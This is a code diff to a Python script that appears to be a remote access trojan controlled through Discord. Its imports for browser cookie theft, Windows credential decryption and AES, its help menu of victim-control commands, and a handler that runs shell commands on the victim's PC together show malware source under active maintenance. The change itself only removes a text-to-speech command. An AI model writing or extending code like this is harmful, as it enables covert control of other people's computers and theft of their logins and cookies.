@@ -1,4 +1,4 @@
-import pyautogui, cv2, time, playsound, threading, win32api, discord, requests,base64, os, json, psutil, ctypes,win32crypt, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, inspect, urllib, shutil
+import pyautogui, cv2, time, threading, win32api, discord, requests,base64, os, json, psutil, ctypes,win32crypt, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, inspect, urllib, shutil
 from discord.ext import commands
 from Crypto.Cipher import AES
 from gtts import gTTS
@@ -111,7 +111,6 @@ help_menu2 = """
 **!opensite** - Opens a site on the user's browser.
 **!key_press** - Press a key.
 **!showtaskbar** \ **!hidetaskbar**
-**!tts (text)** - Text to speech.
 
 `-----COMMUNICATION-----`
 
@@ -1015,21 +1014,6 @@ async def shell(ctx, usid, *, command=""):
                 await ctx.send(f'An error occurred: {str(e)}')
         else:
             await ctx.send(f"Please input a shell command for **{os.getlogin()}**")
-
-@client.command()
-async def tts(ctx, usid, *, text=""):
-    if usid == clientid:
-        if text != "":
-            try:
-                await ctx.send(f"Started saying **{text}** on **{os.getlogin()}**'s PC.")
-                tts = gTTS(text=text, lang='en')
-                tts.save('tts.mp3')
-                playsound.playsound('tts.mp3', True)
-                os.remove('tts.mp3')
-                await ctx.send(f"Finished saying **{text}** on **{os.getlogin()}**'s PC.")
-            except: pass
-        elif text == "":
-            await ctx.send(f"Please input something to say on **{os.getlogin()}**'s PC.")
 
 
 def mainfunc():
